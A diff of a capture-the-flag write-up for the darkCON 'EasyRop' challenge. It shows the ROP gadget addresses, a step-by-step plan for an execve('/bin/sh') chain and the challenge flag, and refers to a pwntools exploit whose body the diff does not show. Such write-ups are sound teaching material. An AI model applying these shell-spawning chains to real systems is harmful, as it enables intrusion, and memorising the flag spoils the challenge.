@@ -1,5 +1,6 @@
 ## EasyRop - Writeup
 
+![challenge description](./chall_description.png)
 We are given a binary that takes user input and then exits:
 `
 Welcome to the darkcon pwn!!
@@ -22,19 +23,19 @@ What do we have to do so:
 	  location of the string, and the two next parameters being just anything 
 
 The challenge is called EasyROP, so let's look for some fitting ROP gadgets.
-I used (ROPgadget)[https://github.com/JonathanSalwan/ROPgadget] and came up with the following list of gadgets I would need:
+I used [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) and came up with the following list of gadgets I would need:
 
-[+] Gadget found: 0x4012d3 syscall 							; making the syscall
-[+] Gadget found: 0x481e65 mov qword ptr [rsi], rax ; ret 	; writing memory 
-[+] Gadget found: 0x40f4be pop rsi ; ret 					; controlling the rsi register
-[+] Gadget found: 0x4175eb pop rax ; ret 					; controlling rax
-[+] Gadget found: 0x40191a pop rdi ; ret 					; ...
-[+] Gadget found: 0x40f4be pop rsi ; ret 
-[+] Gadget found: 0x40181f pop rdx ; ret
+\[+] Gadget found: 0x4012d3 syscall 							; making the syscall
+\[+] Gadget found: 0x481e65 mov qword ptr \[rsi], rax ; ret 	; writing memory 
+\[+] Gadget found: 0x40f4be pop rsi ; ret 					; controlling the rsi register
+\[+] Gadget found: 0x4175eb pop rax ; ret 					; controlling rax
+\[+] Gadget found: 0x40191a pop rdi ; ret 					; ...
+\[+] Gadget found: 0x40f4be pop rsi ; ret 
+\[+] Gadget found: 0x40181f pop rdx ; ret
 
----------+
-The plan:|
----------+
+
+## The Plan
+
 pop writable location into rsi >> 
 pop "/bin/sh" into rax >> 
 call write gadget >> 
@@ -45,6 +46,7 @@ pop /bin/sh location into rdi (the first syscall parameter) >>
 pop the junk data location into rsi and rdx (2. and 3. argument) >>
 pop 0x3b into rax (=(dec)59; syscall number for execve) >> 
 make syscall
+
 --------------------------------
 
 I am using python pwntools for writing the exploit:
@@ -102,4 +104,7 @@ if __name__=="__main__":
 
 
 When executing it we get the following output:
+![terminal output](./terminal_exploit_execution.png)
 
+Well done! 
+We got the flag `darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}` !
